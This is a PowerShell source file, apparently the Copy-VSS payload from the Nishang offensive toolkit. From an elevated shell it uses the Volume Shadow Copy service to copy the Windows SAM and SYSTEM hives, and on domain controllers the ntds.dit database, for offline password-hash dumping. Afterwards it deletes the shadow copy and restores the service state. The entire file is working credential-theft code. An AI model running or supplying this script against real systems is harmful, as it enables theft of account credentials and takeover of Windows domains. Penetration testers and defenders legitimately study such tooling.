function Copy-VSS
{
<#
.SYNOPSIS
Nishang Payload which copies the SAM file (and ntds.dit and SYSTEM hive if run on a Domain Controller).

.DESCRIPTION
This payload uses the VSS service (starts it if not running), creates a shadow of C: 
and copies the SAM file which could be used to dump password hashes from it. If the script is run on a Domain Controller, ntds.dit and SYSTEM hive are also copied.
The script must be run from an elevated shell.
The default path used for SAM is C:\Windows\System32\config\SAM, for SYSTEM hive it is C:\Windows\System32\config\SYSTEM and for
NTDS.dit it is C:\Windows\system32\ntds.dit. Sometimes the ntds.dit is present in other locations like D:\NTDS or C:\Windows\NTDS and so on.
Use $ntdsSource variable to provide the directory.

.PARAMETER PATH
The path where the files would be saved. It must already exist.

.EXAMPLE
PS > Copy-VSS
Saves the files in current run location of the payload.

.Example
PS > Copy-VSS -DestinationDir C:\temp
Saves the files in C:\temp.

.Example
PS > Copy-VSS -DestinationDir C:\temp -ntdsSource D:\ntds\ntds.dit

.LINK
http://www.canhazcode.com/index.php?a=4
https://github.com/samratashok/nishang

.NOTES
Code by @al14s

#>

    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $DestinationDir,

        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $ntdsSource
    )
    $service = (Get-Service -name VSS)
    if($service.Status -ne "Running")
    {
        $notrunning=1
        $service.Start()
    }
    $id = (Get-WmiObject -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
    $volume = (Get-WmiObject win32_shadowcopy -filter "ID='$id'")
    $SAMpath = "$pwd\SAM"
    $SYSTEMpath = "$pwd\SYSTEM"
    $ntdspath = "$pwd\ntds"
    if ($DestinationDir)
    {
        $SAMpath = "$DestinationDir\SAM"
        $SYSTEMpath = "$DestinationDir\SYSTEM"
        $ntdspath = "$DestinationDir\ntds"
    }


    cmd /c copy "$($volume.DeviceObject)\windows\system32\config\SAM" $SAMpath
    cmd /c copy "$($volume.DeviceObject)\windows\system32\config\SYSTEM" $SYSTEMpath
    if($ntdsSource)
    {
        cmd /c copy "$($volume.DeviceObject)\$ntdsSource\ntds.dit" $ntdspath
    }
    else
    {
        cmd /c copy "$($volume.DeviceObject)\windows\system32\ntds.dit" $ntdspath
    }
    $volume.Delete()
    if($notrunning -eq 1)
    {
        $service.Stop()
    } 
}



